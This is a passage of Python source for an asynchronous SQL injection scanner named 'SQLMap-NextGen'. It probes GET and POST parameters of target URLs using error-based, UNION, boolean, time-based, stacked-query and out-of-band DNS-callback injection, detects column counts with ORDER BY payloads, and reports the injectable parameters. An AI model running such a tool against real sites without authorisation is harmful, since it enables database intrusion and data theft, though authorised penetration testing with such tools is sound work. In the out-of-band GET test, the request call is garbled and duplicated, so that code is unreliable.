            method: HTTP method (GET or POST)
            data: POST data dictionary
            scan_techniques: List of techniques to scan for
            callback_domain: Domain for OOB testing
            dbms: Specific DBMS to target
        """
        logger.info(f"Starting scan of {url} using {method} method")
        
        if not scan_techniques:
            scan_techniques = ["error", "union", "boolean", "time", "stacked", "oob"]
        
        # Initialize scan results for this URL
        self.scan_results[url] = {
            "url": url,
            "method": method,
            "scan_started": datetime.now().isoformat(),
            "scan_completed": None,
            "vulnerabilities": [],
            "parameters_tested": 0,
            "payloads_tested": 0,
            "techniques_tested": scan_techniques
        }
        
        # Get baseline response
        baseline = await self.request_manager.get_baseline(url, method, data)
        
        if 'error' in baseline:
            logger.error(f"Failed to get baseline for {url}: {baseline.get('error')}")
            self.scan_results[url]["error"] = baseline.get('error')
            self.scan_results[url]["scan_completed"] = datetime.now().isoformat()
            return
        
        # Handle GET parameters
        if method.upper() == 'GET':
            params = self.url_analyzer.extract_parameters(url)
            base_url = self.url_analyzer.get_base_url(url)
            
            if not params:
                logger.warning(f"No parameters found in URL: {url}")
                # Still try to scan the base URL with path-based injections
                await self._scan_path_based(url)
            else:
                # Scan each parameter
                for param_name, param_value in params.items():
                    logger.info(f"Testing parameter: {param_name}")
                    self.scan_results[url]["parameters_tested"] += 1
                    await self._scan_parameter(base_url, params, param_name, method, scan_techniques, dbms, callback_domain)
                    
        # Handle POST data
        elif method.upper() == 'POST' and data:
            for param_name, param_value in data.items():
                logger.info(f"Testing POST parameter: {param_name}")
                self.scan_results[url]["parameters_tested"] += 1
                await self._scan_post_parameter(url, data, param_name, scan_techniques, dbms, callback_domain)
        else:
            logger.warning(f"No parameters to test for {method} request to {url}")
        
        # Mark scan as completed
        self.scan_results[url]["scan_completed"] = datetime.now().isoformat()
        
        # Summarize findings
        vulns = self.scan_results[url]["vulnerabilities"]
        if vulns:
            logger.info(f"Found {len(vulns)} vulnerabilities in {url}")
            for v in vulns:
                logger.info(f"  - {v['type']} in {v['parameter']}: {v['payload']}")
                # Add to global vulnerability list
                self.vulnerabilities_found.append({
                    "url": url,
                    "method": method,
                    "parameter": v['parameter'],
                    "type": v['type'],
                    "payload": v['payload'],
                    "evidence": v.get('evidence', '')
                })
        else:
            logger.info(f"No SQL injection vulnerabilities found in {url}")
    
    async def _scan_path_based(self, url: str):
        """Scan for path-based SQL injections"""
        # This is a placeholder for path-based injection testing
        # In a real implementation, you would modify the path components of the URL
        # and test for SQL injection vulnerabilities
        logger.info(f"Path-based injection scanning not implemented for {url}")
    
    async def _scan_parameter(self, base_url: str, params: Dict[str, str], param_name: str,
                            method: str, scan_techniques: List[str], dbms: str, callback_domain: str):
        """
        Scan a specific GET parameter for SQL injection
        
        Args:
            base_url: Base URL without query parameters
            params: Dictionary of all parameters
            param_name: Name of parameter to test
            method: HTTP method
            scan_techniques: List of techniques to scan for
            dbms: Specific DBMS to target
            callback_domain: Domain for OOB testing
        """
        original_value = params[param_name]
        
        # Clone params dictionary to avoid modifying original
        test_params = params.copy()
        
        # Test techniques in order
        for technique in scan_techniques:
            if technique == "error":
                await self._test_error_based(base_url, test_params, param_name, original_value, method, dbms)
            elif technique == "union":
                await self._test_union_based(base_url, test_params, param_name, original_value, method)
            elif technique == "boolean":
                await self._test_boolean_based(base_url, test_params, param_name, original_value, method)
            elif technique == "time":
                await self._test_time_based(base_url, test_params, param_name, original_value, method)
            elif technique == "stacked":
                await self._test_stacked_queries(base_url, test_params, param_name, original_value, method)
            elif technique == "oob" and callback_domain:
                await self._test_oob(base_url, test_params, param_name, original_value, method, callback_domain)
    
    async def _scan_post_parameter(self, url: str, data: Dict[str, str], param_name: str,
                                 scan_techniques: List[str], dbms: str, callback_domain: str):
        """
        Scan a specific POST parameter for SQL injection
        
        Args:
            url: Target URL
            data: POST data dictionary
            param_name: Name of parameter to test
            scan_techniques: List of techniques to scan for
            dbms: Specific DBMS to target
            callback_domain: Domain for OOB testing
        """
        original_value = data[param_name]
        
        # Clone data dictionary to avoid modifying original
        test_data = data.copy()
        
        # Test techniques in order
        for technique in scan_techniques:
            if technique == "error":
                await self._test_error_based_post(url, test_data, param_name, original_value, dbms)
            elif technique == "union":
                await self._test_union_based_post(url, test_data, param_name, original_value)
            elif technique == "boolean":
                await self._test_boolean_based_post(url, test_data, param_name, original_value)
            elif technique == "time":
                await self._test_time_based_post(url, test_data, param_name, original_value)
            elif technique == "stacked":
                await self._test_stacked_queries_post(url, test_data, param_name, original_value)
            elif technique == "oob" and callback_domain:
                await self._test_oob_post(url, test_data, param_name, original_value, callback_domain)
    
    async def _test_error_based(self, base_url: str, params: Dict[str, str], param_name: str,
                              original_value: str, method: str, dbms: str):
        """Test for error-based SQL injection in a GET parameter"""
        # Get baseline URL for comparison
        baseline_url = self.url_analyzer.build_url_with_params(base_url, params)
        baseline = await self.request_manager.get_baseline(baseline_url, method)
        
        # Generate error-based payloads
        payloads = self.payload_generator.generate_error_based(dbms)
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            params[param_name] = original_value + payload
            test_url = self.url_analyzer.build_url_with_params(base_url, params)
            
            # Send the request
            response = await self.request_manager.send_request(test_url, method)
            self.scan_results[base_url]["payloads_tested"] += 1
            
            # Check for SQL errors in the response
            is_vulnerable, error_type, evidence = self.response_analyzer.check_for_errors(response)
            
            if is_vulnerable:
                # Found a vulnerability
                self.scan_results[base_url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "error-based",
                    "payload": payload,
                    "evidence": evidence,
                    "error_type": error_type
                })
                logger.info(f"Found error-based SQL injection in parameter {param_name} with payload: {payload}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        params[param_name] = original_value
    
    async def _test_union_based(self, base_url: str, params: Dict[str, str], param_name: str,
                             original_value: str, method: str):
        """Test for UNION-based SQL injection in a GET parameter"""
        # Get baseline URL for comparison
        baseline_url = self.url_analyzer.build_url_with_params(base_url, params)
        baseline = await self.request_manager.get_baseline(baseline_url, method)
        
        # First, try to determine the number of columns
        column_count = await self._detect_column_count(base_url, params, param_name, original_value, method)
        
        if column_count:
            logger.info(f"Detected {column_count} columns for UNION attack")
            # Generate UNION payloads with the detected column count
            payloads = self.payload_generator.generate_union_based(column_count)
        else:
            # If we couldn't determine column count, try generic payloads
            payloads = self.payload_generator.generate_union_based()
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            params[param_name] = original_value + payload
            test_url = self.url_analyzer.build_url_with_params(base_url, params)
            
            # Send the request
            response = await self.request_manager.send_request(test_url, method)
            self.scan_results[base_url]["payloads_tested"] += 1
            
            # Analyze the response for UNION-based injection
            is_vulnerable, evidence = self.response_analyzer.analyze_union_response(baseline, response)
            
            if is_vulnerable:
                # Found a vulnerability
                self.scan_results[base_url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "union-based",
                    "payload": payload,
                    "evidence": evidence
                })
                logger.info(f"Found UNION-based SQL injection in parameter {param_name} with payload: {payload}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        params[param_name] = original_value
    
    async def _detect_column_count(self, base_url: str, params: Dict[str, str], param_name: str,
                                original_value: str, method: str) -> int:
        """
        Detect the number of columns for UNION-based attacks
        
        Returns:
            int: Number of columns detected, or None if detection failed
        """
        # Try ORDER BY method first
        for i in range(1, 21):  # Try up to 20 columns
            # Create ORDER BY payload
            payload = f"' ORDER BY {i} -- "
            params[param_name] = original_value + payload
            test_url = self.url_analyzer.build_url_with_params(base_url, params)
            
            # Send the request
            response = await self.request_manager.send_request(test_url, method)
            self.scan_results[base_url]["payloads_tested"] += 1
            
            # Check if we got an error, which might indicate we've exceeded column count
            is_error, _, _ = self.response_analyzer.check_for_errors(response)
            
            if is_error or response.get('status', 200) >= 500:
                # We've likely exceeded the column count, so the count is i-1
                if i > 1:
                    return i - 1
                else:
                    break
        
        # If ORDER BY method failed, try UNION SELECT with NULL values
        # This approach is not implemented here for brevity, but would involve:
        # 1. Trying UNION SELECT NULL, UNION SELECT NULL,NULL, etc.
        # 2. Detecting which one doesn't cause an error
        
        # Return None if we couldn't determine the column count
        return None
    
    async def _test_boolean_based(self, base_url: str, params: Dict[str, str], param_name: str,
                               original_value: str, method: str):
        """Test for boolean-based SQL injection in a GET parameter"""
        # Get baseline URL for comparison
        baseline_url = self.url_analyzer.build_url_with_params(base_url, params)
        baseline = await self.request_manager.get_baseline(baseline_url, method)
        
        # Generate boolean-based payloads (true/false pairs)
        payloads = self.payload_generator.generate_boolean_based()
        
        # Process payloads in true/false pairs
        for i in range(0, len(payloads), 2):
            if i + 1 >= len(payloads):
                break  # Skip incomplete pair
            
            true_payload = payloads[i]
            false_payload = payloads[i + 1]
            
            # Test the true condition
            params[param_name] = original_value + true_payload
            true_url = self.url_analyzer.build_url_with_params(base_url, params)
            true_response = await self.request_manager.send_request(true_url, method)
            self.scan_results[base_url]["payloads_tested"] += 1
            
            # Test the false condition
            params[param_name] = original_value + false_payload
            false_url = self.url_analyzer.build_url_with_params(base_url, params)
            false_response = await self.request_manager.send_request(false_url, method)
            self.scan_results[base_url]["payloads_tested"] += 1
            
            # Compare responses to see if there's a significant difference
            is_vulnerable, difference_ratio = self.response_analyzer.detect_boolean_difference(
                true_response, false_response
            )
            
            if is_vulnerable:
                # Found a vulnerability
                self.scan_results[base_url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "boolean-based",
                    "payload": true_payload,
                    "difference_ratio": difference_ratio,
                    "true_payload": true_payload,
                    "false_payload": false_payload
                })
                logger.info(f"Found boolean-based SQL injection in parameter {param_name}")
                logger.info(f"  True payload: {true_payload}")
                logger.info(f"  False payload: {false_payload}")
                logger.info(f"  Difference ratio: {difference_ratio}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        params[param_name] = original_value
    
    async def _test_time_based(self, base_url: str, params: Dict[str, str], param_name: str,
                            original_value: str, method: str):
        """Test for time-based SQL injection in a GET parameter"""
        # Get baseline URL for comparison
        baseline_url = self.url_analyzer.build_url_with_params(base_url, params)
        baseline = await self.request_manager.get_baseline(baseline_url, method)
        
        # Generate time-based payloads
        payloads = self.payload_generator.generate_time_based()
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            params[param_name] = original_value + payload
            test_url = self.url_analyzer.build_url_with_params(base_url, params)
            
            # Send the request, expecting a time delay
            response = await self.request_manager.send_request(test_url, method, expect_time_delay=True)
            self.scan_results[base_url]["payloads_tested"] += 1
            
            # Check if the response was delayed
            is_delayed, time_diff = self.response_analyzer.analyze_time_difference(baseline, response)
            
            if is_delayed:
                # Found a vulnerability
                self.scan_results[base_url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "time-based",
                    "payload": payload,
                    "delay": time_diff
                })
                logger.info(f"Found time-based SQL injection in parameter {param_name} with payload: {payload}")
                logger.info(f"  Delay: {time_diff:.2f} seconds")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        params[param_name] = original_value
    
    async def _test_stacked_queries(self, base_url: str, params: Dict[str, str], param_name: str,
                                 original_value: str, method: str):
        """Test for stacked queries SQL injection in a GET parameter"""
        # Get baseline URL for comparison
        baseline_url = self.url_analyzer.build_url_with_params(base_url, params)
        baseline = await self.request_manager.get_baseline(baseline_url, method)
        
        # Generate stacked queries payloads
        payloads = self.payload_generator.generate_stacked_queries()
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            params[param_name] = original_value + payload
            test_url = self.url_analyzer.build_url_with_params(base_url, params)
            
            # Send the request
            response = await self.request_manager.send_request(test_url, method)
            self.scan_results[base_url]["payloads_tested"] += 1
            
            # Check for SQL errors in the response
            is_vulnerable, error_type, evidence = self.response_analyzer.check_for_errors(response)
            
            if is_vulnerable:
                # Found a vulnerability
                self.scan_results[base_url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "stacked-queries",
                    "payload": payload,
                    "evidence": evidence
                })
                logger.info(f"Found stacked queries SQL injection in parameter {param_name} with payload: {payload}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        params[param_name] = original_value
    
    async def _test_oob(self, base_url: str, params: Dict[str, str], param_name: str,
                      original_value: str, method: str, callback_domain: str):
        """Test for out-of-band SQL injection in a GET parameter"""
        # Initialize DNS callback handler
        dns_handler = DNSCallbackHandler(callback_domain)
        if not await dns_handler.setup_dns_server():
            logger.error("Failed to set up DNS callback server, skipping OOB testing")
            return
        
        # Generate OOB payloads with the DNS handler's domain
        payloads = self.payload_generator.generate_oob_payloads(dns_handler.full_domain)
        
        # Track which payloads were sent
        sent_payloads = []
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            params[param_name] = original_value + payload
            test_url = self.url_analyzer.build_url_with_params(base_url, params)
            
            # Send the request
            await self.request_manager.send_request(test_url), method
                                                    # Send the request
            await self.request_manager.send_request(test_url, method)
            self.scan_results[base_url]["payloads_tested"] += 1
            sent_payloads.append(payload)
        
        # Wait for and check DNS callbacks
        logger.info(f"Waiting for DNS callbacks to {dns_handler.full_domain}...")
        callbacks = await dns_handler.check_for_callbacks()
        
        if callbacks:
            # Found a vulnerability
            for callback in callbacks:
                self.scan_results[base_url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "out-of-band",
                    "payload": "OOB payloads",
                    "callback": callback
                })
            logger.info(f"Found out-of-band SQL injection in parameter {param_name}")
            logger.info(f"  Callbacks received: {len(callbacks)}")
        
        # Reset the parameter to its original value
        params[param_name] = original_value
    
    # Implementation of POST parameter testing methods
    # These methods are similar to the GET methods but work with POST data
    async def _test_error_based_post(self, url: str, data: Dict[str, str], param_name: str,
                                   original_value: str, dbms: str):
        """Test for error-based SQL injection in a POST parameter"""
        # Get baseline
        baseline = await self.request_manager.get_baseline(url, 'POST', data)
        
        # Generate error-based payloads
        payloads = self.payload_generator.generate_error_based(dbms)
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            data[param_name] = original_value + payload
            
            # Send the request
            response = await self.request_manager.send_request(url, 'POST', data)
            self.scan_results[url]["payloads_tested"] += 1
            
            # Check for SQL errors in the response
            is_vulnerable, error_type, evidence = self.response_analyzer.check_for_errors(response)
            
            if is_vulnerable:
                # Found a vulnerability
                self.scan_results[url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "error-based",
                    "payload": payload,
                    "evidence": evidence,
                    "error_type": error_type
                })
                logger.info(f"Found error-based SQL injection in POST parameter {param_name} with payload: {payload}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        data[param_name] = original_value
    
    async def _test_union_based_post(self, url: str, data: Dict[str, str], param_name: str,
                                  original_value: str):
        """Test for UNION-based SQL injection in a POST parameter"""
        # Similar to the GET version, but for POST requests
        # Get baseline
        baseline = await self.request_manager.get_baseline(url, 'POST', data)
        
        # Generate UNION payloads
        payloads = self.payload_generator.generate_union_based()
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            data[param_name] = original_value + payload
            
            # Send the request
            response = await self.request_manager.send_request(url, 'POST', data)
            self.scan_results[url]["payloads_tested"] += 1
            
            # Analyze the response for UNION-based injection
            is_vulnerable, evidence = self.response_analyzer.analyze_union_response(baseline, response)
            
            if is_vulnerable:
                # Found a vulnerability
                self.scan_results[url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "union-based",
                    "payload": payload,
                    "evidence": evidence
                })
                logger.info(f"Found UNION-based SQL injection in POST parameter {param_name} with payload: {payload}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        data[param_name] = original_value
    
    async def _test_boolean_based_post(self, url: str, data: Dict[str, str], param_name: str,
                                    original_value: str):
        """Test for boolean-based SQL injection in a POST parameter"""
        # Similar to the GET version, but for POST requests
        # Get baseline
        baseline = await self.request_manager.get_baseline(url, 'POST', data)
        
        # Generate boolean-based payloads
        payloads = self.payload_generator.generate_boolean_based()
        
        # Process payloads in true/false pairs
        for i in range(0, len(payloads), 2):
            if i + 1 >= len(payloads):
                break  # Skip incomplete pair
            
            true_payload = payloads[i]
            false_payload = payloads[i + 1]
            
            # Test the true condition
            data[param_name] = original_value + true_payload
            true_response = await self.request_manager.send_request(url, 'POST', data)
            self.scan_results[url]["payloads_tested"] += 1
            
            # Test the false condition
            data[param_name] = original_value + false_payload
            false_response = await self.request_manager.send_request(url, 'POST', data)
            self.scan_results[url]["payloads_tested"] += 1
            
            # Compare responses to see if there's a significant difference
            is_vulnerable, difference_ratio = self.response_analyzer.detect_boolean_difference(
                true_response, false_response
            )
            
            if is_vulnerable:
                # Found a vulnerability
                self.scan_results[url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "boolean-based",
                    "payload": true_payload,
                    "difference_ratio": difference_ratio,
                    "true_payload": true_payload,
                    "false_payload": false_payload
                })
                logger.info(f"Found boolean-based SQL injection in POST parameter {param_name}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        data[param_name] = original_value
    
    async def _test_time_based_post(self, url: str, data: Dict[str, str], param_name: str,
                                 original_value: str):
        """Test for time-based SQL injection in a POST parameter"""
        # Similar to the GET version, but for POST requests
        # Get baseline
        baseline = await self.request_manager.get_baseline(url, 'POST', data)
        
        # Generate time-based payloads
        payloads = self.payload_generator.generate_time_based()
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            data[param_name] = original_value + payload
            
            # Send the request, expecting a time delay
            response = await self.request_manager.send_request(url, 'POST', data, expect_time_delay=True)
            self.scan_results[url]["payloads_tested"] += 1
            
            # Check if the response was delayed
            is_delayed, time_diff = self.response_analyzer.analyze_time_difference(baseline, response)
            
            if is_delayed:
                # Found a vulnerability
                self.scan_results[url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "time-based",
                    "payload": payload,
                    "delay": time_diff
                })
                logger.info(f"Found time-based SQL injection in POST parameter {param_name} with payload: {payload}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        data[param_name] = original_value
    
    async def _test_stacked_queries_post(self, url: str, data: Dict[str, str], param_name: str,
                                      original_value: str):
        """Test for stacked queries SQL injection in a POST parameter"""
        # Similar to the GET version, but for POST requests
        # Get baseline
        baseline = await self.request_manager.get_baseline(url, 'POST', data)
        
        # Generate stacked queries payloads
        payloads = self.payload_generator.generate_stacked_queries()
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            data[param_name] = original_value + payload
            
            # Send the request
            response = await self.request_manager.send_request(url, 'POST', data)
            self.scan_results[url]["payloads_tested"] += 1
            
            # Check for SQL errors in the response
            is_vulnerable, error_type, evidence = self.response_analyzer.check_for_errors(response)
            
            if is_vulnerable:
                # Found a vulnerability
                self.scan_results[url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "stacked-queries",
                    "payload": payload,
                    "evidence": evidence
                })
                logger.info(f"Found stacked queries SQL injection in POST parameter {param_name} with payload: {payload}")
                # Once we find one vulnerability of this type, return
                return
        
        # Reset the parameter to its original value
        data[param_name] = original_value
    
    async def _test_oob_post(self, url: str, data: Dict[str, str], param_name: str,
                          original_value: str, callback_domain: str):
        """Test for out-of-band SQL injection in a POST parameter"""
        # Similar to the GET version, but for POST requests
        # Initialize DNS callback handler
        dns_handler = DNSCallbackHandler(callback_domain)
        if not await dns_handler.setup_dns_server():
            logger.error("Failed to set up DNS callback server, skipping OOB testing")
            return
        
        # Generate OOB payloads with the DNS handler's domain
        payloads = self.payload_generator.generate_oob_payloads(dns_handler.full_domain)
        
        # Track which payloads were sent
        sent_payloads = []
        
        # Test each payload
        for payload in payloads:
            # Update the parameter with the payload
            data[param_name] = original_value + payload
            
            # Send the request
            await self.request_manager.send_request(url, 'POST', data)
            self.scan_results[url]["payloads_tested"] += 1
            sent_payloads.append(payload)
        
        # Wait for and check DNS callbacks
        logger.info(f"Waiting for DNS callbacks to {dns_handler.full_domain}...")
        callbacks = await dns_handler.check_for_callbacks()
        
        if callbacks:
            # Found a vulnerability
            for callback in callbacks:
                self.scan_results[url]["vulnerabilities"].append({
                    "parameter": param_name,
                    "type": "out-of-band",
                    "payload": "OOB payloads",
                    "callback": callback
                })
            logger.info(f"Found out-of-band SQL injection in POST parameter {param_name}")
        
        # Reset the parameter to its original value
        data[param_name] = original_value
    
    def generate_report(self, output_file: str = None, report_format: str = 'json'):
        """
        Generate a report of scan results
        
        Args:
            output_file: Path to output file
            report_format: Format of the report ('json', 'html', or 'xml')
        
        Returns:
            str: Path to the saved report file, or the report content if no output_file specified
        """
        # Compile report data
        report_data = {
            "scan_info": {
                "tool_name": "SQLMap-NextGen",
                "tool_version": "1.0.0",
                "scan_date": datetime.now().isoformat(),
                "urls_scanned": list(self.scan_results.keys()),
                "vulnerabilities_found": len(self.vulnerabilities_found)
            },
            "scan_results": self.scan_results,
            "vulnerabilities": self.vulnerabilities_found
        }
        
        # Generate report in the specified format
        if report_format.lower() == 'json':
            report_content = json.dumps(report_data, indent=2)
        elif report_format.lower() == 'html':
            report_content = self._generate_html_report(report_data)
        elif report_format.lower() == 'xml':
            report_content = self._generate_xml_report(report_data)
        else:
            report_content = json.dumps(report_data, indent=2)
        
        # Save report to file if specified
        if output_file:
            with open(output_file, 'w') as f:
                f.write(report_content)
            logger.info(f"Report saved to {output_file}")
            return output_file
        else:
            return report_content
    
    def _generate_html_report(self, report_data: Dict) -> str:
        """Generate an HTML report from the scan results"""
        # Simple HTML report template
        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQLMap-NextGen Scan Report</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 0; padding: 20px; color: #333; }}
        h1, h2, h3 {{ color: #2c3e50; }}
        .container {{ max-width: 1200px; margin: 0 auto; }}
        .header {{ background-color: #34495e; color: white; padding: 20px; margin-bottom: 20px; }}
        .section {{ margin-bottom: 30px; }}
        .vulnerability {{ background-color: #f8d7da; border: 1px solid #f5c6cb; padding: 15px; margin-bottom: 10px; border-radius: 4px; }}
        .details {{ margin-top: 10px; font-family: monospace; padding: 10px; background-color: #f8f9fa; border-radius: 4px; }}
        table {{ border-collapse: collapse; width: 100%; }}
        th, td {{ text-align: left; padding: 8px; border-bottom: 1px solid #ddd; }}
        th {{ background-color: #f2f2f2; }}
        .summary {{ display: flex; justify-content: space-around; margin-bottom: 20px; }}
        .summary-item {{ text-align: center; padding: 10px; background-color: #e9ecef; border-radius: 4px; min-width: 150px; }}
        .error {{ color: #721c24; }}
        .success {{ color: #155724; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>SQLMap-NextGen Scan Report</h1>
            <p>Generated on: {report_data['scan_info']['scan_date']}</p>
        </div>
        
        <div class="section">
            <h2>Scan Summary</h2>
            <div class="summary">
                <div class="summary-item">
                    <h3>URLs Scanned</h3>
                    <p>{len(report_data['scan_info']['urls_scanned'])}</p>
                </div>
                <div class="summary-item">
                    <h3>Vulnerabilities</h3>
                    <p class="{('error' if report_data['scan_info']['vulnerabilities_found'] > 0 else 'success')}">
                        {report_data['scan_info']['vulnerabilities_found']}
                    </p>
                </div>
            </div>
        </div>
        
        <div class="section">
            <h2>Vulnerabilities Found</h2>
            
            {"".join([f'''
            <div class="vulnerability">
                <h3>{vuln['type'].upper()} Injection in {vuln['parameter']}</h3>
                <p><strong>URL:</strong> {vuln['url']}</p>
                <p><strong>Method:</strong> {vuln['method']}</p>
                <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                <p><strong>Payload:</strong> {vuln['payload']}</p>
                {f"<p><strong>Evidence:</strong> {vuln.get('evidence', '')}</p>" if vuln.get('evidence') else ""}
            </div>
            ''' for vuln in report_data['vulnerabilities']]) if report_data['vulnerabilities'] else "<p>No vulnerabilities found.</p>"}
        </div>
        
        <div class="section">
            <h2>Scan Details</h2>
            
            {"".join([f'''
            <div class="section">
                <h3>URL: {url}</h3>
                <div class="details">
                    <p><strong>Method:</strong> {details['method']}</p>
                    <p><strong>Scan Started:</strong> {details['scan_started']}</p>
                    <p><strong>Scan Completed:</strong> {details['scan_completed']}</p>
                    <p><strong>Parameters Tested:</strong> {details['parameters_tested']}</p>
                    <p><strong>Payloads Tested:</strong> {details['payloads_tested']}</p>
                    <p><strong>Techniques:</strong> {', '.join(details['techniques_tested'])}</p>
                    
                    <h4>Vulnerabilities:</h4>
                    {"".join([f'''
                    <div class="vulnerability">
                        <p><strong>Type:</strong> {vuln['type']}</p>
                        <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                        <p><strong>Payload:</strong> {vuln['payload']}</p>
                        {f"<p><strong>Evidence:</strong> {vuln.get('evidence', '')}</p>" if vuln.get('evidence') else ""}
                    </div>
                    ''' for vuln in details['vulnerabilities']]) if details['vulnerabilities'] else "<p>None</p>"}
                </div>
            </div>
            ''' for url, details in report_data['scan_results'].items()])}
        </div>
    </div>
</body>
</html>
"""
        return html
    
    def _generate_xml_report(self, report_data: Dict) -> str:
        """Generate an XML report from the scan results"""
        root = ET.Element("report")
        
        # Add scan info
        scan_info = ET.SubElement(root, "scan_info")
        ET.SubElement(scan_info, "tool_name").text = report_data['scan_info']['tool_name']
        ET.SubElement(scan_info, "tool_version").text = report_data['scan_info']['tool_version']
        ET.SubElement(scan_info, "scan_date").text = report_data['scan_info']['scan_date']
        
        urls = ET.SubElement(scan_info, "urls_scanned")
        for url in report_data['scan_info']['urls_scanned']:
            ET.SubElement(urls, "url").text = url
        
        ET.SubElement(scan_info, "vulnerabilities_found").text = str(report_data['scan_info']['vulnerabilities_found'])
        
        # Add vulnerabilities
        vulns = ET.SubElement(root, "vulnerabilities")
        for vuln in report_data['vulnerabilities']:
            vuln_elem = ET.SubElement(vulns, "vulnerability")
            ET.SubElement(vuln_elem, "type").text = vuln['type']
            ET.SubElement(vuln_elem, "url").text = vuln['url']
            ET.SubElement(vuln_elem, "method").text = vuln['method']
            ET.SubElement(vuln_elem, "parameter").text = vuln['parameter']
            ET.SubElement(vuln_elem, "payload").text = vuln['payload']
            if 'evidence' in vuln:
                ET.SubElement(vuln_elem, "evidence").text = vuln['evidence']
        
        # Add scan results
        results = ET.SubElement(root, "scan_results")
        for url, details in report_data['scan_results'].items():
            result = ET.SubElement(results, "result")
            ET.SubElement(result, "url").text = url
            ET.SubElement(result, "method").text = details['method']
            ET.SubElement(result, "scan_started").text = details['scan_started']
            ET.SubElement(result, "scan_completed").text = details['scan_completed']
            ET.SubElement(result, "parameters_tested").text = str(details['parameters_tested'])
            ET.SubElement(result, "payloads_tested").text = str(details['payloads_tested'])
            
            techniques = ET.SubElement(result, "techniques_tested")
            for technique in details['techniques_tested']:
                ET.SubElement(techniques, "technique").text = technique
            
            result_vulns = ET.SubElement(result, "vulnerabilities")
            for vuln in details['vulnerabilities']:
                vuln_elem = ET.SubElement(result_vulns, "vulnerability")
                ET.SubElement(vuln_elem, "type").text = vuln['type']
                ET.SubElement(vuln_elem, "parameter").text = vuln['parameter']
                ET.SubElement(vuln_elem, "payload").text = vuln['payload']
                if 'evidence' in vuln:
                    ET.SubElement(vuln_elem, "evidence").text = vuln['evidence']
        
        # Convert to string
        return ET.tostring(root, encoding='unicode', method='xml')

async def scan_url_list(urls, techniques=None, callback_domain=None, proxy=None, headers=None, cookies=None, 
                   output_file=None, report_format='json', custom_payloads=None, timeout=10):
    """
    Scan a list of URLs for SQL injection vulnerabilities
    
    Args:
        urls: List of URLs to scan
        techniques: List of techniques to scan for
        callback_domain: Domain for OOB testing
        proxy: Proxy URL
        headers: Custom headers
        cookies: Custom cookies
        output_file: Path to output file
        report_format: Format of the report
        custom_payloads: Path to custom payloads file
        timeout: Request timeout in seconds
    
    Returns:
        str: Path to the saved report file, or the report content if no output_file specified
    """
    # Initialize components
    request_manager = RequestManager(proxy=proxy, headers=headers, cookies=cookies, timeout=timeout)
    payload_generator = SQLiPayloadGenerator(custom_payloads_file=custom_payloads)
    response_analyzer = ResponseAnalyzer()
    
    # Initialize scanner
    scanner = SQLiScanner(request_manager, payload_generator, response_analyzer)
    
    # Initialize session
    await request_manager.initialize_session()
    
    try:
        # Scan each URL
        for url in urls:
            await scanner.scan_url(url, scan_techniques=techniques, callback_domain=callback_domain)
    finally:
        # Close session
        await request_manager.close_session()
    
    # Generate report
    return scanner.generate_report(output_file, report_format)

def load_urls_from_file(file_path: str) -> List[str]:
    """Load URLs from a file, one URL per line"""
    with open(file_path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='SQLMap-NextGen: Advanced SQL Injection Scanner')
    
    # Target options
    target_group = parser.add_argument_group('Target')
    target_group.add_argument('-u', '--url', help='Target URL')
    target_group.add_argument('-f', '--file', help='File containing URLs to scan (one per line)')
    
    # Request options
    request_group = parser.add_argument_group('Request')
    request_group.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET', help='HTTP method (default: GET)')
    request_group.add_argument('-d', '--data', help='POST data')
    request_group.add_argument('-p', '--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    request_group.add_argument('-H', '--header', action='append', help='Custom header (can be used multiple times)')
    request_group.add_argument('-c', '--cookie', help='Cookies to use for the requests')
    request_group.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    
    # Scan options
    scan_group = parser.add_argument_group('Scan')
    scan_group.add_argument('--techniques', nargs='+', choices=['error', 'union', 'boolean', 'time', 'stacked', 'oob'],
                           help='Techniques to use (default: all)')
    scan_group.add_argument('--dbms', choices=['mysql', 'postgresql', 'mssql', 'oracle', 'sqlite'],
                          help='Target DBMS')
    scan_group.add_argument('--custom-payloads', help='Path to custom payloads JSON file')
    scan_group.add_argument('--callback-domain', help='Domain for OOB testing')
    
    # Output options
